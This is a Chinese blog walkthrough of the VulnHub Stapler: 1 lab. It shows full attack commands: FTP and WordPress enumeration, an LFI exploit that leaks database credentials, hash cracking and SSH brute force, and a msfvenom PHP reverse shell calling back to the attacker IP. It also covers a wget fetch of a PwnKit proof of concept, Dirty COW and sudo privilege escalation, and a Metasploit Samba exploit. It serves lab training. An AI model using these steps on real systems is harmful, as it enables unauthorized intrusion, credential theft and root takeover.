---
title: Stapler-1
author: Creexile
date: 2024-09-28 21:06:01
lastMod: 2025-04-10
summary: 'No.6'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [MySQL, FTP, SMB, 文件上传, 提权, 漏洞利用, 渗透]
---

# Stapler: 1

---

No.6

> 来源: [vulnhub靶场-Stapler:1](https://www.vulnhub.com/entry/stapler-1,150/)
>
> 目标: Get Root!
>
> 提示: 至少有2种途径获得shell, 至少有3种方法获得root权限
>
> 妙妙工具: python -c 'import pty; pty.spawn("/bin/bash")'

## 环境配置

kali: 192.168.56.6

target:192.168.56.12

## 信息收集

```
nmap -sS 192.168.56.0/24
nmap -p- 192.168.56.12
nmap -A 192.168.56.12
```

好多的端口呀

- 端口: 21,22,53,80,139,666,3306,12380, 还有未开放20,123,137,128
- 服务: ftp3.0.3, dnsmasp 2.75, PHP server 5.5(80), MySQL 5.7.12, Apache 2.4.18(12380), smbd 4.3.9(139)
- 路径: 仅在80端口有`.bashrc`和`.profile`, 无可用信息
- 可能利用: ftp有匿名登录

利用用户名为`Anonymous`, 密码为空登录ftp服务,找到一个note文件

![image-20240928144651989](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928144651989.png)

下载发现存在两个人名`Elly`和`John`, 可能是账号; 你的意思是? 有文件上传?

```
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

> 看不懂666端口在干嘛, 据说可以用nc连接上去看看这个图片

所以现在有可能能用的就是12380端口Apache, 以及139端口的smb; 下一步可能可以利用的就是22端口和3306端口

冻手!

12380处怎么访问都是跳转首页, 令人疑惑, 抓包发现跳转前返回400, 可能是协议错了, 更换为https发现正常, 可以重新扫描

```
/phpmyadmin
/robots.txt
# 下面都是从robots.txt中来
/admin112233
/blogblog
```

1. 先去/admin112233看看

直接弹窗, 内容为`This could of been a BeEF-XSS hook ;)`, 抓包也没有任何东西, 可能为前端js弹窗

禁用js后返回另一条: `Give yourself a cookie! Javaseript didn't run =)`

但是给自己设置了cookie后也没有任何的用处啊, 拉倒吧

2. 再去/blogblog

居然是wordpress框架, 扫一下先, 发现可以查看已安装的插件

```
/blogblog/readme.html    # version 4.2.1
/blogblog/wp-admin
/blogblog/wp-config.php    # 空
/blogblog/wp-login.php
/blogblog/wp-cron.php    # 空
/blogblog/wp-includes    # 只能看文件名和架构
/blogblog/wp-content
```

`/blogblog/wp-content/plugins`下是该网站安装的插件, 也许可以利用漏洞

![image-20240928165857732](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928165857732.png)

```bash
searchsploit advanced video
# 你别说还真有 WordPress Plugin Advanced Video 1.0 - Local File Inclusion | php/webapps/39646.py
# 省略复制下来的过程, 就是locate然后cp, 诶! 你先别急着运行
python2 39646.py
```

记得复制下来更改目标ip, 再加上关于SSL认证才能用

> 我相信你通过这个网址能明白为什么要在py文件中加上两行代码
>
> https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error

![image-20240928173606615](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928173606615.png)

现在返回`/blogblog/wp-content/uploads/`会新增jpeg文件, 这个就是配置文件了, 整下来

> 运行目录下会新增个report文件夹, 可惜啥也没有

```bash
# 忽略ssl认证
wget --no-check-certificate https://192.168.56.12:12380/blogblog/wp-content/uploads/650253163.jpeg
# 分析一下是什么文件, 改成对应文件类型
file 650253163.jpeg
mv 650253163.jpeg config.php
```

通过这个wordpress的配置文件获取到了MySQL的密码:`root : plbkac`, 登录查表

```mysql
mysql -uroot -pplbkac -h 192.168.56.12
show databases;
use wordpress;
show tables;
select * from wp_users;
select user_login,user_pass from wp_users;
```

![image-20240928175835329](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928175835329.png)

## getshell

下面就是爆破密码了, 无论用什么方法, 你先把密码整下来变成一个文件(利用awk的方法放在附录)

> 到达这里只剩wordpress后台和ssh没动过了, smb?(无感情)因为是直接拿到root我就写在附录里面了

掏出`john`进行爆破, 爆出来账密`john : incorrect`, 可以登陆wordpress后台了

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pass1.txt
# 没有rockyou.txt就去/usr/share/wordlists/下解压对应文件
```

后台找到了上传点`Plugins->Add New->Upload Plugin`, 你也可以直接用这个: `/blogblog/wp-admin/plugin-install.php?tab=upload`

而且似乎没有过滤, msf立马杀过来

```bash
# msfvenom
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.6 lport=10000 -f raw -o shell.php

# msfconsole
set payload php/meterpreter/reverse_tcp
set lhost 192.168.56.6
set lport 10000
run
```

在`/blogblog/wp-content/uploads/`找到并点击那个php文件即可, 这就拿到shell了

关于ssh, 您猜怎么着, 我拿mysql爆出来的用户名以及已知的密码爆出来了: `zoe : plbkac`

```bash
hydra 192.168.1.36 ssh -L users.txt -P pass.txt
# 这里的pass是user_email中扒出来的, 其实我两列都跑了
# 毕竟从nmap的扫描中可以得到计算机叫做red, 而邮箱又是@red.localhost, 跑跑试试呗
```

这下两个shell方法都集齐了(可能直接用永恒之蓝不算getshell)

这里注意到每个用户下都有一个`.bash_history`, 结合我们在80端口下载的文件, 这是一个记录用户历史命令的文件; 可能会有有用的信息

```bash
cat /home/*/.bash_history
```

![image-20240928195135296](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928195135296.png)

很巧地得到了用户账密: `JKanode : thisimypassword`, `peter : JZQuyIN5`

## 提权

信息收集

```bash
whoami
# www-data
uname -a
# Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
lsb_release -a
# Ubuntu 16.04 LTS
gcc -v / g++ -v / cc -v
# gcc环境有的
cat /etc/passwd
# 这个实在是太多了
```

给一个批量查询id的linux脚本(记得给予权限), 问就是看看是不是有权限比较高的用户

```bash
#!/bin/bash

# 定义需要查询的用户名列表
usernames=("Aparnell" "Drew" "LSolum2" "RNunemaker" "Sam" "jess" "www" "CCeaser" "ETollefson" "JKanode" "MBassin" "SHAY" "Taylor" "kai" "zoe" "CJoo" "Eeth" "JLipps" "MFrei" "SHayslett" "elly" "mel" "DSwanger" "IChadwick" "LSolum" "NATHAN" "SStroud" "jamie" "peter")

# 循环遍历用户名列表
for username in "${usernames[@]}"
do
    # 使用id命令查询用户的userid并输出结果
    userid=$(id $username)
    echo "用户名：$username 的userid为：$userid"
done
```

![image-20240928194728160](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928194728160.png)

我们可以找到peter是可以用sudo提权的, 诶! 这密码不就有用了

### sudo提权

```bash
ssh peter@192.168.56.12
# JZQuyIN5
sudo -l
# (ALL : ALL) ALL 任何位置都能提权
sudo su
```

![image-20240928200104393](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928200104393.png)

### 脏牛提权

再怎么强大也是假的, dirty cow影响版本从2.6.22-4.8.3/4.7.9/4.4.26, 你这个4.4.0有些不够看了

```bash
searchsploit 40847
# 靶机这边
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
# 这些都写在这个cpp文件开头了
```

![image-20240928201744890](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928201744890.png)

### CVE-2021-4034

这个在我打了4个靶机之后, 我宣布它通杀 ubuntu16

https://github.com/arthepsy/CVE-2021-4034

```bash
wget http://192.168.56.6:12000/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o poc
chmod 777 poc
./poc
```

![image-20240928202702042](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928202702042.png)

## 附录

### awk拆分

[Linux awk 命令](https://www.runoob.com/linux/linux-comm-awk.html)

```bash
awk -F'|' '{print $3}' mysql.txt > pass1.txt
awk -F'|' '{print $2}' mysql.txt > user1.txt
```

效果预览, 记得自己再处理一下

![image-20240928181816535](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928181816535.png)

### smb-永恒之蓝

139端口就是这样的, 我们搜索到的如下:

```
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
```

搜一下, 然后拿几个比较新的, 是excellent的试一下

> 其实再排一下Linux, 基本上就剩下一个了

```bash
search Samba
# exploit/linux/samba/is_known_pipename 那就是你了
use exploit/linux/samba/is_known_pipename
set rhost 192.168.56.12
set rport 139
run
```

![image-20240928204146507](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240928204146507.png)
